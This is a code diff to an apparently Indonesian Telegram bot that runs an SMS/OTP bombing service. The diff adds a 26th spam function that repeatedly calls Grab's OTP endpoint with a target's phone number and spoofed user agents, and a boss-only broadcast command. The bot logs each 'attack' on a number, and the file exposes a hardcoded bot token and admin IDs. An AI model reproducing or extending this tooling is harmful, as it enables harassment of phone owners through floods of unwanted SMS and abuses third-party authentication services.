@@ -27,10 +27,10 @@ updater = Updater("5329815334:AAHxG2ZlEsxMgZYx-uqIkRpAV0uEqW42zXk",
   
 
 
-# LIST ADMIN
-admins = [854756142, 5014001714, 925204449]
+# LIST ADMIN & BOSS
+admins = [854756142, 5014001714, 925204449 ]
 
-
+boss = 854756142
 
 # COOLDOWN
 throttle_data = {
@@ -78,6 +78,20 @@ def help(update: Update, context: CallbackContext):
         update.message.reply_text("MAAF ANDA SIAPA YAA???")
         context.bot.send_message(chat_id=854756142, text=f"! ADA PENYUSUP !\n\nUsername : {update.message.from_user.username}\nID : {update.message.from_user.id}")
   
+
+
+def bc(update: Update, context: CallbackContext):
+    if update.message.from_user.id == boss:
+        bctext = ' '.join(context.args)
+        for x in range(len(admins)):
+            context.bot.send_message(chat_id=admins[x], text=f"! PESAN BROADCAST !\n\n{bctext}")
+
+        context.bot.send_message(chat_id=854756142, text=f"! BERHASIL KIRIM BROADCAST KE ID !\n\n{admins}")
+    else:
+        update.message.reply_text("LU SAHA WOYY??? GAADA IZIN WLEK")
+        context.bot.send_message(chat_id=854756142, text=f"! ADA PENYUSUP BROADCAST !\n\nUsername : {update.message.from_user.username}\nID : {update.message.from_user.id}")
+
+
 
 
 @throttle
@@ -524,6 +538,18 @@ def spam(update: Update, context: CallbackContext):
                     else:
                         update.message.reply_text("ERROR SPAMMING [25] [STATUS => GAGAL NGAB :(")
 
+        
+
+
+                def sp26():
+                    gasss = requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": ua.random}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"62{nohp}"})
+                    if "challenge_id" in gasss.text:
+                        update.message.reply_text("SPAMMING SUKSES [26] [STATUS => SIP MANTAB >:)") 
+                    else:
+                        update.message.reply_text("ERROR SPAMMING [26] [STATUS => GAGAL NGAB :(")
+
+
+
             try:
                 # FUNCTION SPAMMER
                 context.bot.send_message(chat_id=854756142, text=f"LOG PENYERANGAN :\n\nUsername : {update.message.from_user.username}\nID : {update.message.from_user.id}\n\nMELAKUKAN PENYERANGAN TERHADAP NOMOR => 0{nohp}\n\nTANGGAL | WAKTU : {dt.strftime('%d-%m-%Y | %H:%M:%S %Z %z')}")
@@ -582,6 +608,8 @@ def spam(update: Update, context: CallbackContext):
                 sleep(1)
                 sp25()
                 sleep(1)
+                sp26()
+                sleep(1)
                 update.message.reply_text(f"===========SELESAI===========\n\nNOMOR TARGET => 0{nohp}")
             except:
                 update.message.reply_text(f"! TERDAPAT ERROR SAAT MELAKUKAN PENYERANGAN TERHADAP NOMOR => 0{nohp} !")
@@ -598,6 +626,7 @@ def spam(update: Update, context: CallbackContext):
 updater.dispatcher.add_handler(CommandHandler('start', start))
 updater.dispatcher.add_handler(CommandHandler('help', help))
 updater.dispatcher.add_handler(CommandHandler('spam', spam))
+updater.dispatcher.add_handler(CommandHandler('bc', bc))
   
 
   
